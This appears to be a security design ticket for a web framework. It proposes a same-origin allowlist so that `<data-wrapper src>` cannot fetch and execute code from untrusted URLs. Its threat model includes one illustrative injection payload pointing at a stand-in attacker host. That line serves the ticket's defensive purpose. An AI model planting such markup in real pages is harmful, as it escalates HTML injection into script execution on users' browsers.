# Ticket 016: Trusted-source policy for `<data-wrapper src>`

## Status

READY — default posture ratified (Option B, same-origin). Build pending role
assignment.

## Problem

`load()` fetches a view URL and **executes** its `<script type="module"
data-module>` (blob URL + dynamic `import`). That makes `src` a code-execution
sink, not just a data fetch.

The danger is escalation: on a page with a strict CSP, an attacker who achieves
HTML injection normally finds `<script>` and inline handlers inert. But an
injected `<data-wrapper src="//attacker.example/x.html">` (or a same-origin
`src="/uploads/user.html"`) hands the framework a mandate to fetch and run code.
Inert markup injection becomes script execution.

CSP is **not** an available mitigation here: runtime import maps + blob module
composition require a permissive `script-src` (`blob:`, plus any shim CDN). A
`script-src` strict enough to stop the escalation also breaks the framework.
So the framework itself has to enforce a source policy.

Related fixes already landed (this review):
- `$innerhtml`/`$outerhtml` throw; raw HTML needs the named `$unsafeHTML`
  opt-in (`bind`, `PROP_ALIASES`).
- `javascript:`/`vbscript:` values are neutralized in URL attributes
  (`href`/`src`/`action`/`formaction`) in `setProp`.

This ticket covers the third and largest face: which URLs a wrapper may load.

## Design

A "trusted source" allowlist, enforced in `load()` / `loadChildWrapper` before
fetch. Model it on CSP's own trust story.

1. **Snapshot the policy once, at framework init.** Read it before any UGC can
   enter the DOM; a policy injected later must not be able to widen it. This is
   the security-load-bearing detail — without it, an attacker who can inject a
   `<data-wrapper>` can also inject a policy tag. Same rule CSP follows (policy
   must precede content).

2. **Policy source.** A `<meta name="data-wrapper-src-policy" content="...">`
   read at init. Prefer meta over a `data-*` on the framework `<script>` so
   page-level policy is not confused with the script's functional attributes,
   and matches the CSP-meta mental model.

3. **Match granularity** (content is a space/`;`-separated list):
   - `'self'` — same-origin only. The one-token 80% win; kills
     `src="//attacker.example/…"`. Note: does **not** stop same-origin
     user-uploaded HTML.
   - origin entries (`https://cdn.example.com`) — allow specific cross-origin.
   - path-prefix entries (`/views/`) — needed for the same-origin-upload case:
     restrict loads to your own views directory.

4. **Enforcement.** Resolve `new URL(src, baseURI)`, test against the snapshot,
   and on violation **refuse to load + `console.error`** with attribution. A
   blocked src is hostile runtime data, not a dev-authoring mistake, so it does
   not throw the app down (consistent with the `javascript:`-scheme handling). A
   dev typo pointing outside the allowlist surfaces the same clear error.

## Decision (ratified)

**Default posture: Option B — same-origin (secure-by-default).** Cross-origin
`src` requires an explicit policy. Protects the majority with zero config; only
the cross-origin-view minority opts in. The documented CDN *install* loads the
**framework** via `<script src>`, not a cross-origin `<data-wrapper src>`, so
this does not regress the install story. It is a behavior change only for anyone
loading a genuinely cross-origin view.

This default is chosen out of *necessity*: the framework can't rely on a strict
CSP today (see below), so a same-origin default is the strongest posture we can
enforce ourselves without new platform work.

## Future direction: step up a tier

Same-origin-by-default is a framework-enforced allowlist standing in for a
platform control we can't currently use. The north star is to step up a tier —
let apps run a **strict `script-src` CSP** so the browser neutralizes the
injection-to-execution escalation directly, and our allowlist becomes
defense-in-depth rather than the sole line.

The open question is whether the multi-import-map + blob module composition is
*inherently* CSP-incompatible or just needs adapting:
- blob-URL module scripts require `script-src blob:`. Can inline `data-module`
  scripts register via a real URL (or nonce/hash) instead of a blob?
- the dynamically-injected `<script type="importmap">` needs a nonce or hash
  under a strict policy — can the framework thread a page nonce through?
- multiple import maps are now spec-supported; confirm strict-CSP behavior
  across the target browsers.

If none of these is a hard wall — i.e. multi-import-maps are not unsafe by
definition — a strict-CSP-compatible mode is worth its own ticket, and this
same-origin default becomes the belt to that CSP's suspenders.

Strict authoring mode would change the component format. Inline
`<script type="module" data-module>` blocks would no longer be the default
authoring path, because the current runtime turns them into blob modules. A
strict mode would likely require external module files via
`<script type="module" data-module="..." src="./component.js">`, a static or
nonce-aware import-map story, and browser verification across the supported
matrix.

## Non-goals

- Not a CSP replacement; complements it where CSP can't be strict.
- No allowlist for the framework's own module import / import-map composition —
  that is trusted first-party config, not a per-wrapper UGC surface.

## Acceptance

- Policy snapshotted at init; a policy tag injected after load cannot widen it
  (contract test: inject a `<meta>` post-init, assert it has no effect).
- With Option B default (or an explicit policy), a cross-origin / out-of-prefix
  `src` is refused and logged; an allowed `src` loads normally.
- `bun review` green; size stays within the ticket 015 budget (report the delta).
- A `views/docs/security.html` section (dogfooded) documents the policy, the
  `$unsafeHTML` opt-in, and the URL-scheme neutralization.
